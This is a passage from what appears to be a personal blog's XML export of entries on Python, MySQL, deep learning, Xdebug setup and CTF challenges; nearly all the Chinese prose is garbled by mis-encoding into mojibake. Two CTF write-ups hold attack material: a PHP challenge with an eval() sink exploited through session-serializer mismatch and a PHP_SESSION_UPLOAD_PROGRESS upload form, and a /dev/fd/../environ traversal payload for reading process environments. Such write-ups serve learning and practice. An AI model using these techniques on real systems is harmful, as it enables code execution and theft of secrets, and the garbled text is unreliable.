'robin':'the brave'&#125;for key, value in knights.items(): print(key, value) listå¾ªçŽ¯ 12for index, value in enumerate(['tac', 'tic', 'toe']): print("index = &#123;&#125;, value = &#123;&#125;".format(index, value)) ä¸¤ä¸ªlistå¾ªçŽ¯ 12345questions = ['name', 'quest', 'favorite color']answers = ['lancelot', 'the holy grail', 'blue']for q,a in zip(questions, answers): print("what is your &#123;&#125;? It is &#123;&#125;".format(q, a)) é€†å‘å¾ªçŽ¯ 123# é€†å‘å¾ªçŽ¯åºåˆ—æ—¶ï¼Œå…ˆæ­£å‘ï¼Œå†è°ƒç”¨reverse()å‡½æ•°for i in reversed(range(1, 10, 2)): print(i) æŒ‡å®šé¡ºåºå¾ªçŽ¯ï¼Œç”¨sortedå‡½æ•° å‚æ•°çš„ä¼ é€’ ä¹‹å‰è¿˜ä¸€ç›´æ²¡æ˜Žç™½pythonä¸­**paramè¿™ç§ä¼ é€’å½¢å¼çš„ç”¨æ³• è¿™ä¸ªæ —å­å°±å¾ˆæ£’å•¦ 123456789101112def cheeseshop(kind, *arguments, **keywords): print("-- Do you have any", kind, "?") print("-- I'm sorry, we're all out of", kind) for arg in arguments: print(arg) print("-" * 40) for kw in keywords: print(kw, ":", keywords[kw])cheeseshop("Limburger", "It's very runny, sir.", "It's really very, VERY runny, sir.",shopkeeper="Michael Palin", client="John Cleese", sketch="Cheese Shop Sketch") ç»“æžœå¦‚ä¸‹ï¼š 12345678-- Do you have any Limburger ?-- I&apos;m sorry, we&apos;re all out of LimburgerIt&apos;s very runny, sir.It&apos;s really very, VERY runny, sir.----------------------------------------shopkeeper : Michael Palinsketch : Cheese Shop Sketchclient : John Cleese ç¬¬ä¸€ä¸ªkindå‚æ•°å°±æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¹‹åŽargumentsç›¸å½“äºŽä¸€ä¸ªæŽ¥æ”¶äº†ä¸€ä¸ªlistï¼ŒkeywordsæŽ¥æ”¶äº†ä¸€ä¸ªdict è§£åŒ…å‚æ•°åˆ—è¡¨ æ¯”å¦‚è¿™ä¸ªæ —å­ï¼š 12args = [3,6]list(range(*args)) è¾“å‡ºçš„ç»“æžœå°±æ˜¯ [3,4,5] ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡*è¿ç®—ç¬¦æ¥å¯¹ä¸€ä¸ªlistè¿›è¡Œè§£åŒ…å¹¶å°†å…¶ä½œä¸ºå‚æ•°ä¼ é€’ åŒ¿åå‡½æ•°lambda 12pairs = [(1, 'one'), (2, 'two'), (3, 'three'), (4, 'four')]pairs.sort(key=lambda pair:pair[1]) sortæ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æŒ‡å®šå¾…æŽ’åºçš„å…³é”®å­—ï¼Œä¸€ä¸ªæ˜¯reversedï¼Œå…¶ä¸­keyç”¨ä¸€ä¸ªåŒ¿åå‡½æ•°è¿›è¡ŒæŒ‡å®šï¼Œæœ‰ä¸€ç‚¹å‡½æ•°å¼ç¼–ç¨‹çš„å‘³é“]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æŽ¢å¯»æ•°æ®åº“]]></title>
    <url>%2F2019%2F07%2F22%2F%E6%8E%A2%E5%AF%BB%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[mysqlå‘½ä»¤è¡Œæ“ä½œå°ç»“ æ„Ÿè§‰è¿™äº›çŸ¥è¯†åˆå¿«å¿˜è®°äº† ç™»é™† mysql -u root -p åˆ›å»ºæ•°æ®åº“ create database databasename åˆ é™¤æ•°æ®åº“ drop database databasename ä»Žå¤–éƒ¨sqlæ–‡ä»¶å¯¼å…¥ï¼Œå¦‚æžœsqlæ–‡ä»¶ä¸­æ²¡æœ‰åˆ›å»ºæ•°æ®åº“éœ€è¦å…ˆæŒ‡å®šä¸€ä¸ªæ•°æ®åº“ç„¶åŽsource path/*.sqlå°±å¯ä»¥å¯¼å…¥äº†ï¼Œå†ä¹Ÿä¸ç”¨å—çƒ¦äººçš„phpmyadminå½±å“äº† åˆ é™¤æ•°æ®è¡¨drop table table_name å¯¼å‡ºè¡¨mysqldump -u root -p RUNOOB runoob_tbl &gt; dump.txt å¯¼å‡ºæ•°æ®åº“mysqldump -u root -p RUNOOB &gt; database_dump.txt å¤‡ä»½æ‰€æœ‰æ•°æ®åº“mysqldump -u root -p --all-databases &gt; database_dump.txt ä¸€èˆ¬sqlæ–‡ä»¶çš„å†™æ³•ï¼š 123456789drop database if exists DBName;creat database DBName;use DBName;#å¼€å§‹åˆ›å»ºè¡¨create ......#å¼€å§‹æ’å…¥æ•°æ®insert.... ä½¿ç”¨pymysqlè¿žæŽ¥æ•°æ®åº“ 1234567891011import pymsqlcon = pymysql.connect('localhost', 'root', '', 'mpsa')try: with con.cursor() as cursor: sql = 'drop database runoob' cursor.execute(sql) con.commit()finally: con.close() é‚£ä¸ªcursorå‡½æ•°æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ˜Žç™½ä¸ºä»€ä¹ˆï¼Œä¸è¿‡ä¸€èˆ¬çš„ç”¨æ³•å°±æ˜¯è¿™æ ·å•¦ phpè¿žæŽ¥æ•°æ®åº“ ä½¿ç”¨phpè¿žæŽ¥æ•°æ®åº“,åˆ›å»ºæ•°æ®åº“ï¼Œç„¶åŽåˆ é™¤ 123456789101112131415$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(!$conn)&#123; die("error!!");&#125;echo "è¿žæŽ¥æˆåŠŸ";//æŸ¥è¯¢æ•°æ®$sql = "create database runoob";$retval = mysqli_query($conn, $sql);if(!$retval)&#123; die("æŸ¥è¯¢æ•°æ®å¤±è´¥ï¼");&#125;echo "åˆ›å»ºæˆåŠŸ";$sql1 = "drop database runoob";$retval = mysqli_query($conn, $sql);mysqli_close($conn); é‡åˆ°äº†é—®é¢˜ï¼š æŸ¥äº†ä¸€ä¸‹stackoverflow çœ‹åˆ°äº†è¿™ä¸ªå›žç­”ï¼š The mysqli-&gt;connect_error property only works properly as of PHP versions 5.2.9 and 5.3.0. Use the mysqli_connect_error() function if compatibility with earlier PHP versions is required. 12345678910111213141516171819$mysqli = new mysqli('localhost', 'my_user', 'my_password', 'my_db');/* * This is the "official" OO way to do it, * BUT $connect_error was broken until PHP 5.2.9 and 5.3.0. */if ($mysqli-&gt;connect_error) &#123; die('Connect Error (' . $mysqli-&gt;connect_errno . ') ' . $mysqli-&gt;connect_error);&#125;/* * Use this instead of $connect_error if you need to ensure * compatibility with PHP versions prior to 5.2.9 and 5.3.0. */if (mysqli_connect_error()) &#123; die('Connect Error (' . mysqli_connect_errno() . ') ' . mysqli_connect_error());&#125; åŽŸæ¥æ˜¯å»ºç«‹è¿‡ç¨‹ä¸­çš„ä¸ç¨³å®šï¼Œæ€ªä¸å¾—æˆ‘æ–°å»ºçš„æ•°æ®åº“æ²¡æœ‰è¢«åˆ æŽ‰. å‚è€ƒ stackoverflowçš„å›žç­” pymysqlæ–‡æ¡£ï¼Œå†™çš„å¾ˆç®€å•]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-challenge9]]></title>
    <url>%2F2019%2F07%2F22%2Fphp-challenge9%2F</url>
    <content type="text"><![CDATA[php-challenge 9 ç¬¬ä¸€æ¬¡æŽ¥è§¦åˆ°è¿™ä¸ªé¢˜ç›®ï¼Œè¢«æƒŠå‘†äº† 12345678910111213141516171819202122232425&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; åˆçœ‹æºä»£ç è§‰å¾—å¹¶æ²¡æœ‰å“ªé‡Œå¯ä»¥è®©æˆ‘ååºåˆ—åŒ–æ³¨å…¥çš„åœ°æ–¹ ä½†æ˜¯é—®é¢˜å°±å‡ºåœ¨ç¬¬ä¸€å¥è¯ï¼š ini_set('session.serialize_handler', 'php'); å…³é”®ç‚¹åœ¨äºŽï¼Œå¦‚æžœè„šæœ¬ä¸­è®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸Žphp.iniè®¾ç½®çš„ä¸åŒï¼Œæˆ–è€…ä¸¤ä¸ªè„šæœ¬æ³¨å†Œsessionä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸åŒï¼Œé‚£ä¹ˆå°±ä¼šå‡ºçŽ°å®‰å…¨é—®é¢˜ã€‚ åªéœ€è¦åŠ ä¸€ä¸ª|å°±è¡Œ è¿™é“jarvisOjé¢˜ç›®å°±æ˜¯è¿™ä¸ªåŽŸé¢˜ è¿™é‡Œè¿˜ç”¨åˆ°äº†å¦å¤–ä¸€ä¸ªæ¼æ´žï¼š è‡ªå·±æž„é€ ä¸€ä¸ªç½‘é¡µå¦‚ä¸‹ï¼š 12345&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; ç„¶åŽåœ¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œæœ¬åœ°æŠ“åŒ…ï¼Œè¿™é‡Œé‡åˆ°äº†ä¸€ç‚¹å°é—®é¢˜ï¼Œå°±æ˜¯æ²¡åŠžæ³•æŠ“åˆ°æœ¬åœ°çš„åŒ…ï¼Œå¯ä»¥é€šè¿‡ç›´æŽ¥å¯¹å±€åŸŸç½‘çš„ç½‘ç»œè¿žæŽ¥è¿›è¡Œè®¾ç½®å³å¯. æ­¤æ—¶å°±å¯ä»¥çœ‹åˆ°äº† æŽ¥ä¸‹æ¥ç»§ç»­åˆ©ç”¨ tqlã€‚ã€‚ã€‚ æœ‰è¶£çš„phpååºåˆ—åŒ–æ€»ç»“ szfszf jarvisoj-web-writeup]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[deep learning1]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning1%2F</url>
    <content type="text"><![CDATA[æ„ŸçŸ¥æœºè¡¥å…… æŽ¥ç€å†™ æ„ŸçŸ¥æœºçš„è®­ç»ƒä¸­ï¼Œè€å¸ˆè¿˜æä¾›äº†ä¸€éƒ¨ä»½èµ„æ–™ï¼Œæ¯”å¦‚è®­ç»ƒå‡º$y=2x$ æˆ‘ä»¬ç®€è¦åœ°çœ‹ä¸€ä¸‹ä¸€æ¬¡è®­ç»ƒçš„ç»“æžœï¼š bias x y w0 w1 yout y-yout adj0 adj1 alpha w0new w1new 1 0.512 1.023 0.719 0.403 0.926 0.977 0.977 0.500 0.7 0.788 0.438 è¿›è¡Œå¾ˆå¤šæ¬¡è®­ç»ƒä¹‹åŽç”»å‡ºçš„å›¾å½¢ï¼š é¢„æµ‹çš„è¿˜æ˜¯æŒºå‡†ç¡®çš„ ä¸ºä»€ä¹ˆéœ€è¦biasï¼Ÿ æ¦‚å¿µä¸Šå¾ˆå¥½ç†è§£ï¼Œbiaså°±æ˜¯å°†ä¸€ä¸ªæ­£æ¯”ä¾‹å‡½æ•°å˜ä¸ºäº†ä¸€æ¬¡å‡½æ•°ï¼Œè¿™æ ·ä¸å¿…æ¯æ¬¡éƒ½è¿‡åŽŸç‚¹ï¼Œåˆ†ç±»çš„å‡†ç¡®æ€§ä¹Ÿå°±å¤§å¤§åœ°æé«˜äº† å¤šå±‚æ„ŸçŸ¥æœº ä¸€å±‚çš„æ„ŸçŸ¥æœºæ˜¯æ²¡åŠžæ³•å¤„ç†å¼‚æˆ–é—®é¢˜çš„ æ‰€ä»¥éœ€è¦å¢žåŠ éšè—å±‚ å°±åƒä¸‹é¢è¿™æ ·ï¼š è¿™æ ·å°±å¯ä»¥åšåˆ°äº†ï¼š æ„Ÿè§‰MLPçš„æ•°å­¦çŸ¥è¯†å¤ªè¿‡å¤æ‚äº†ï¼Œæš‚æ—¶æ”¾ç€ keras ä»Žæ —å­ä»£ç å¼€å§‹ï¼š 12345678910111213141516171819202122from keras.models import Sequentialmodel = Sequential()from keras.layers import Dense'''ä½¿ç”¨addæ¥å †å æ¨¡åž‹'''model.add(Dense(units=64, activation='relu', input_dim=100))model.add(Dense(units=10, activation='softmax'))'''ä½¿ç”¨compileæ¥é…ç½®å­¦ä¹ è¿‡ç¨‹'''model.compile(loss='categorical_crossentropy', optimizer='sgd', metrics=['accuracy'])# x_train å’Œ y_train æ˜¯ Numpy æ•°ç»„ -- å°±åƒåœ¨ Scikit-Learn API ä¸­ä¸€æ ·ã€‚model.fit(x_train, y_train, epochs=5, batch_size=32)'''è¯„ä¼°æ¨¡åž‹'''loss_and_metrics = model.evaluate(x_test, y_test, batch_size=128)classes = model.predict(x_test, batch_size=128) Sequential compile åœ¨è®­ç»ƒæ¨¡åž‹ä¹‹å‰ï¼Œéœ€è¦é…ç½®å­¦ä¹ è¿‡ç¨‹ï¼ŒcompileæŽ¥æ”¶ä¸‰ä¸ªå‚æ•° ä¼˜åŒ–å™¨optimizer æŸå¤±å‡½æ•°loss è¯„ä¼°æ ‡å‡†metrics ä¸€ä¸ªä¸ªæ¥çœ‹ ä¼˜åŒ–å™¨ å¯ä»¥å…ˆå®žä¾‹åŒ–ä¸€ä¸ªä¼˜åŒ–å™¨å¯¹è±¡ï¼Œç„¶åŽå°†å®ƒä¼ å…¥model.compile()ï¼Œæˆ–è€…å¯ä»¥é€šè¿‡ æŸå¤±å‡½æ•° æŸå¤±å‡½æ•°ï¼ˆæˆ–ç§°ç›®æ ‡å‡½æ•°ã€ä¼˜åŒ–è¯„åˆ†å‡½æ•°ï¼‰æ˜¯ç¼–è¯‘æ¨¡åž‹æ—¶æ‰€éœ€çš„ä¸¤ä¸ªå‚æ•°ä¹‹ä¸€ï¼š 1model.compile(loss='mean_squared_error', optimizer='sgd') æˆ‘ä»¬å¯ä»¥ä¼ é€’ä¸€ä¸ªçŽ°æœ‰çš„æŸå¤±å‡½æ•°åï¼Œæˆ–è€…ä¸€ä¸ªtensorflowç¬¦å·å‡½æ•°ï¼Œæœ‰ä»¥ä¸‹ä¸¤ä¸ªå‚æ•° y_true: çœŸå®žæ ‡ç­¾. y_pred: é¢„æµ‹å€¼,å…¶shapeä¸Žy_trueç›¸åŒ å¯ç”¨çš„æŸå¤±å‡½æ•°ï¼š mean_squared_error mean_absolute_error ç­‰ å‚è€ƒ ç¥žç»ç½‘ç»œä¸­w,bå‚æ•°çš„ä½œç”¨ï¼ˆä¸ºä½•éœ€è¦åç½®bçš„è§£é‡Šï¼‰ æ·±åº¦å­¦ä¹ ä¸­åç§»é¡¹biasçš„ä½œç”¨]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[deep learning0]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning0%2F</url>
    <content type="text"><![CDATA[deep learning æ•´ç†ä¸€ä¸‹ä¸Šè¯¾çš„ç¬”è®°ï¼Œä¸ç„¶å…¨éƒ½ä¼šå¿˜äº†åŽ» æ— ç›‘ç£å­¦ä¹  self organizing map ç®€ç§°SOMç®—æ³• å¤§æ„ï¼šç»™å®šä¸€ä¸ªå‘é‡$v_{k}$,å¯»æ‰¾åˆ°è·ç¦»æœ€è¿‘çš„ç¥žç»å…ƒ æ‰¾åˆ°æœ€æŽ¥è¿‘çš„ç¥žç»å…ƒ $$n_{bmu}=\underset{1\leqslant i\leqslant m}{argmin}\left | v_{k}-n_{i} \right |$$ æ›´æ–°$n_{i}$ wikipediaä¸Šä¸€å¼ å¾ˆå½¢è±¡çš„å›¾ç‰‡: è“è‰²æ–‘ç‚¹æ˜¯è®­ç»ƒæ•°æ®çš„åˆ†å¸ƒï¼Œå°ç™½è‰²å…‰ç›˜æ˜¯ä»Žè¯¥åˆ†å¸ƒä¸­æŠ½å–çš„å½“å‰è®­ç»ƒæ•°æ®ã€‚é¦–å…ˆï¼ˆå·¦ï¼‰ï¼ŒSOMèŠ‚ç‚¹ä»»æ„åœ°ä½äºŽæ•°æ®ç©ºé—´ä¸­ã€‚é€‰æ‹©æœ€æŽ¥è¿‘è®­ç»ƒåŸºå‡†çš„èŠ‚ç‚¹ï¼ˆä»¥é»„è‰²çªå‡ºæ˜¾ç¤ºï¼‰ã€‚å®ƒè¢«ç§»å‘è®­ç»ƒæ•°æ®ï¼Œå› ä¸ºï¼ˆåœ¨è¾ƒå°ç¨‹åº¦ä¸Šï¼‰æ˜¯å®ƒåœ¨ç½‘æ ¼ä¸Šçš„é‚»å±…ã€‚åœ¨å¤šæ¬¡è¿­ä»£ä¹‹åŽï¼Œç½‘æ ¼å€¾å‘äºŽè¿‘ä¼¼æ•°æ®åˆ†å¸ƒï¼ˆå³ï¼‰ã€‚ æœ‰ç›‘ç£å­¦ä¹  æ•°å­¦çŸ¥è¯† ç‰¹å¾å‘é‡ çº¿æ€§ä»£æ•°ä¸­çš„ç‰¹å¾å‘é‡ï¼š å¯¹äºŽä¸€ä¸ªç»™å®šçš„æ–¹é˜µAï¼Œå®ƒçš„ç‰¹å¾å‘é‡vç»è¿‡çº¿æ€§å˜åŒ–ä¹‹åŽï¼Œå¾—åˆ°çš„æ–°å‘é‡ä»ç„¶ä¸ŽåŽŸæ¥çš„vä¿æŒåœ¨åŒä¸€æ¡ç›´çº¿ä¸Šï¼Œä½†å…¶é•¿åº¦æˆ–æ–¹å‘ä¹Ÿè®¸ä¼šæ”¹å˜ï¼Œå³ï¼š $$Av=\lambda v$$ æ­¤æ—¶$v$å°±æ˜¯çŸ©é˜µ$A$çš„ç‰¹å¾å‘é‡ï¼Œ$\lambda$å°±æ˜¯å¯¹åº”çš„ç‰¹å¾å€¼ è¿›ä¸€æ­¥ï¼šåœ¨ä¸€å®šæ¡ä»¶ä¸‹ï¼Œä¸€ä¸ªå˜æ¢å¯ä»¥ç”±å…¶ç‰¹å¾å€¼ç‰¹å¾å‘é‡å®Œå…¨è¡¨è¿°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰çš„ç‰¹å¾å‘é‡ç»„æˆäº†è¿™å‘é‡ç©ºé—´çš„ä¸€ç»„åŸºåº•ã€‚ ä¸€ä¸ªç‰¹å¾ç©ºé—´æ˜¯å…·æœ‰ç›¸åŒç‰¹å¾å€¼çš„ç‰¹å¾å‘é‡ä¸Žä¸€ä¸ªåŒç»´æ•°çš„é›¶å‘é‡çš„é›†åˆï¼Œæ¯”å¦‚$E_{\lambda }=\left { u\in V | Au=\lambda u\right }$å³ä¸ºçº¿æ€§å˜åŒ–$A$ä¸­ä»¥$\lambda$ä¸ºç‰¹å¾å€¼çš„ç‰¹å¾ç©ºé—´ æŠ½è±¡æ¦‚å¿µä¸å®¹æ˜“ç†è§£ï¼Œä¸¾å‡ ä¸ªæ —å­ï¼š æ’ç­‰å˜æ¢$I$çš„ç‰¹å¾å‘é‡ $$I(v)=v=1\cdot v$$ å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„ç‰¹å¾å‘é‡éƒ½æ˜¯æ’ç­‰å˜æ¢$I$çš„ç‰¹å¾å‘é‡ï¼Œæ’ç­‰å˜æ¢çš„ç‰¹å¾ç©ºé—´åªæœ‰ä¸€ä¸ªå°±æ˜¯æ•´ä¸ªç©ºé—´ ç±»ä¼¼çš„ï¼Œæ•°ä¹˜å˜æ¢$\lambda I$çš„ç‰¹å¾å‘é‡ä¹Ÿæ˜¯æ‰€æœ‰çš„éžé›¶å‘é‡ï¼Œå› ä¸ºæŒ‰ç…§å®šä¹‰ï¼š $$\lambda I(v) = \lambda \cdot v$$ æ„ŸçŸ¥å™¨ çœ‹å¼ å›¾ï¼š æ•°å­¦è¡¨è¿°ä¸ºï¼š$t = f(\sum {i=1}^{n} w{i}x_{i} + b) = f(\mathbf{w}^{T} \mathbf{x})$ få‡½æ•°çš„è¡¨è¾¾å¼ï¼š $$f(x) = \left{\begin{matrix} 1 &amp; if , w \cdot x + b &gt; 0 \ 0 &amp; else \end{matrix}\right.$$ $\mathbf{x} = \left [ x_{1}, x_{2} ... , x_{n} , \ 1 \right]^{T}$, $\mathbf{w} = \left [ w_{1}, w_{2} , ...w_{n} , \ b \right]^{T}$ å¦‚ä½•è®­ç»ƒï¼Ÿ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªè®­ç»ƒä¸Žè¿ç®—çš„demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445import numpy as npdef load_data(): ''' åŠ è½½æ•°æ®ï¼Œinput_dataå’Œlabelså¯¹åº” ''' input_data = [[1, 1], [0, 0], [1, 0], [0, 1]] labels = [1, 0, 0, 0] return input_data, labelsdef train_pre(input_data, y, iteration, rate): ''' è®­ç»ƒï¼Œæ›´æ–°wå’Œb ''' unit_step = lambda x: 0 if x &lt; 0 else 1 w = np.random.rand(len(input_data[0])) bias = 0.0 for i in range(iteration): samples = zip(input_data, y) for (input_i, label) in samples: result = input_i * w + bias result = float(sum(result)) y_pred = float(unit_step(result)) w = w + rate * (label - y_pred) * np.array(input_i) bias = rate * (label - y_pred) return w, biasdef predict(input_i, w, b): ''' é¢„æµ‹ ''' unit_step = lambda x: 0 if x &lt; 0 else 1 result = input_i * w + b result = sum(result) y_pred = float(unit_step(result)) print(y_pred)if __name__ == "__main__": input_data, y = load_data() w, b = train_pre(input_data, y, 20, 0.01) predict([1, 1], w, b) æˆ‘ä»¬å¾ˆæƒŠè®¶åœ°å‘çŽ°ä¸€ä¸ªå¦‚æ­¤ç®€å•åœ°æ¨¡åž‹ç«Ÿç„¶ä¸å¯æ€è®®åœ°å®Œæˆäº†è¿™ä¸ªä»»åŠ¡ã€‚ æ•°æ®æ›´æ–°ï¼š $w(j) := w(j) + \alpha (y-f(x))x(j) (j = 1,...n)$ å¼‚æˆ–é—®é¢˜ å½“æ—¶è€å¸ˆä¸Šè¯¾æ—¶å€™æåˆ°å¼‚æˆ–é—®é¢˜æ˜¯ä¸å¯è§£çš„ï¼ŒåŽæ¥æŸ¥äº†ä¸€ä¸‹èµ„æ–™æ‰æ˜Žç™½åœ¨ç¥žç»ç½‘ç»œå‘å±•çš„æ—©æœŸï¼Œå¼‚æˆ–é—®é¢˜ç¡®å®žæ˜¯ä¸å¯è§£çš„ï¼Œä¸è¿‡é€šè¿‡åŠ å…¥éšè—å±‚ä½¿å¾—å¼‚æˆ–é—®é¢˜èƒ½å¤Ÿæœ‰äº†æ–°çš„è§£æ³• å¦‚ä¸‹å›¾ï¼š å¤ä¹ çš„æ—¶å€™æ‰æ³¨æ„åˆ°åŽŸæ¥è€å¸ˆæåˆ°äº†é€šè¿‡åŠ å…¥éšè—å±‚çš„æ–¹å¼æ¥è§£å†³å¼‚æˆ–é—®é¢˜ å‚è€ƒèµ„æ–™ ã€æœºå™¨å­¦ä¹ ã€‘ç¥žç»ç½‘ç»œå®žçŽ°å¼‚æˆ–ï¼ˆXORï¼‰ 1.5 å›¾å½¢åŒ–ç†è§£ç¥žç»ç½‘ç»œä¸­çš„å¼‚æˆ–é—®é¢˜ æ„ŸçŸ¥å™¨ wikipedia]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ä»ŽGooglectfä¸€é“é¢˜è®¤è¯†ä¸€ä¸‹é“¾æŽ¥æ–‡ä»¶]]></title>
    <url>%2F2019%2F07%2F21%2F%E4%BB%8EGooglectf%E4%B8%80%E9%81%93%E9%A2%98%E8%AE%A4%E8%AF%86%E4%B8%80%E4%B8%8B%E9%93%BE%E6%8E%A5%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Linuxç›®å½• æºè‡ªGooglectf2017çš„ä¸€é“é¢˜ å¯ä»¥é€šè¿‡få‚æ•°ç›´æŽ¥è¯»å–åˆ°æƒ³è¯»çš„æ–‡ä»¶ flagè—åœ¨ /proc/environä¸­ï¼Œæ€Žä¹ˆæ‰èƒ½è¿›å…¥åˆ°è¿™ä¸ªç›®å½•ï¼Ÿ Linuxä¸­æœ‰ä¸€ä¸ªå«åšsymlink method ä¹Ÿå°±æ˜¯ç›¸å½“äºŽä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œä½†æ˜¯å´ä¸åŒäºŽWindowsä¸­çš„shortcut è€Œæ­£å¥½ï¼š/dev/fdè¿™ä¸ªæŒ‡å‘äº†/proc/self/fdè¿™æ ·payloadå°±ä¸éš¾ç†è§£äº†ï¼š /dev/fd/../environ è®¿é—®/dev/fdå°±ç›¸å½“äºŽè®¿é—®äº†/proc/selfä¹‹åŽå›žé€€ä¸€æ¬¡å°±å¯ä»¥æ‰¾åˆ°environè¿™ä¸ªæ–‡ä»¶äº† Linuxä¸­ /dev/fd/0è¿è¡Œæ•ˆæžœæ˜¯è¿™æ ·çš„ï¼Œç›¸å½“äºŽä½ è¾“å…¥å•¥å®ƒå°±ä¼šå›žç­”å•¥ 12345 âœ˜ pxy@LAPTOP-UBIEP4K5 ~ sudo cat /dev/fd/0aapxypxy æŽ¥ä¸‹æ¥äº†è§£ä¸€ä¸‹lnå‘½ä»¤ è½¯é“¾æŽ¥ï¼šè‹±æ–‡symbolic linkéžå¸¸ç±»ä¼¼äºŽWindowsä¸­çš„å¿«æ·æ–¹å¼ ç¡¬é“¾æŽ¥ï¼šè‹±æ–‡hard linkè¿™ç±»æ–‡ä»¶ä¼šæ‹¥æœ‰è‡ªå·±çš„inodeèŠ‚ç‚¹å’Œåç§°ï¼Œå…¶inodeä¼šæŒ‡å‘æ–‡ä»¶å†…å®¹æ‰€åœ¨çš„æ•°æ®å—emmmåŽé¢ä¸æ˜¯å¾ˆæ‡‚äº† å»ºç«‹è½¯é“¾æŽ¥çš„æ–¹å¼ï¼š ln -s æºæ–‡ä»¶åç§° è½¯é“¾æŽ¥æ–‡ä»¶åç§° ç›®å½•å’Œæ–‡ä»¶å‡å¯ çŽ°åœ¨å½“å‰å—ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæŒ‡å‘/proc/sysçš„é“¾æŽ¥ ç„¶åŽæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç›®å½•éåŽ†æ¥è¿›å…¥åˆ°å…¶ä»–çš„ç›®å½•äº†ã€‚ è½¯é“¾æŽ¥è¿˜ä¼šå­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼š é“¾æŽ¥çš„é‡å¤å®šä¹‰ è¿™æ ·å°±ä¸ä¼šå‡ºé—®é¢˜äº†ï¼ŒåŠ ä¸ª-né€‰é¡¹ å‚è€ƒ]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vscodeè°ƒè¯•php]]></title>
    <url>%2F2019%2F07%2F21%2Fvscode%E8%B0%83%E8%AF%95php%2F</url>
    <content type="text"><![CDATA[ä½¿ç”¨vscodeè°ƒè¯•phpä»£ç  ä¸‹è½½xdebug å®˜ç½‘ ä½†æ˜¯éœ€è¦è‡ªå·±ç¡®å®šphpçš„ç‰ˆæœ¬å’Œç¼–è¯‘å™¨çš„ç‰ˆæœ¬ ä½†æ˜¯å®˜ç½‘çš„é“¾æŽ¥ä¼¼ä¹Žæœ‰é—®é¢˜ï¼Œphp5.5çš„ä¸¤ä¸ªåè¿‡æ¥äº† ä¹‹åŽå°†å…¶æ·»åŠ åˆ°php.iniæ–‡ä»¶ä¸­ 1234[XDebug]zend_extension = php_xdebug-2.5.5-5.5-vc11.dllxdebug.remote_enable = 1xdebug.remote_autostart = 1 å°†phpæ·»åŠ åˆ°çŽ¯å¢ƒå˜é‡ä¸­ è¿™å°±ä¸ç»†è¯´äº† é…ç½®vscodeä¸­çš„phpè·¯å¾„ åœ¨settings.jsonä¸­æŒ‡å®š è°ƒè¯• è¸©åˆ°çš„å‘ VScodeçš„php debugæ’ä»¶é»˜è®¤æ˜¯ç”¨çŽ¯å¢ƒå˜é‡ä¸­çš„phpæ¥è¿›è¡Œè°ƒè¯•çš„ï¼Œæ‰€ä»¥phpå¦‚æžœæ²¡æœ‰åŠ å…¥åˆ°çŽ¯å¢ƒå˜é‡ä¸­çš„è¯æ˜¯ä¼šæŠ¥é”™çš„ã€‚ æˆ‘åˆšå¼€å§‹ç”¨äº†wampserverçš„phpæ¥è¿›è¡Œè°ƒè¯•ï¼Œä½†æ˜¯åŽæ¥å¤±è´¥äº†ï¼Œè¯´æ˜¯æ²¡åŠžæ³•åŠ è½½xdebugæ’ä»¶ï¼Œæ‰€ä»¥æ¢æˆäº†phpstudy æ‰¾ä¸åˆ°settingæ–‡ä»¶ï¼Ÿè¿™ä¸ªå‘å®³æƒ¨äº† åœ¨è¿™ä¸ªåœ°æ–¹éœ€è¦æ·»åŠ phpçš„è·¯å¾„ ä¸¤ç§è°ƒè¯•æ–¹å¼ï¼Œä¸€ç§æ˜¯listen for xdebugï¼Œéœ€è¦æ‰“å¼€æµè§ˆå™¨ï¼Œå¦ä¸€ç§æ˜¯launch currently open script]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT D-link]]></title>
